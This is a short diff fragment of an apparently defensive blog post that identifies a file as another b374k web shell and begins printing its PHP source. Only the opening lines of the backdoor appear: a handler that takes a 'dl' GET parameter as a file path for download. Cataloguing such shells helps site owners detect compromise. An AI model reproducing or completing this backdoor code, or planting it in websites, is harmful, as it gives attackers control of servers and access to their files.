@@ -14,7 +14,7 @@ tags:
 ---
 This looks like another b374k shell.
 
-## b374k Backdoor Script Source Code
+### b374k Backdoor Script Source Code
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?php if (isset($_GET['dl']) && ($_GET['dl'] != "")) {
     $file = $_GET['dl'];
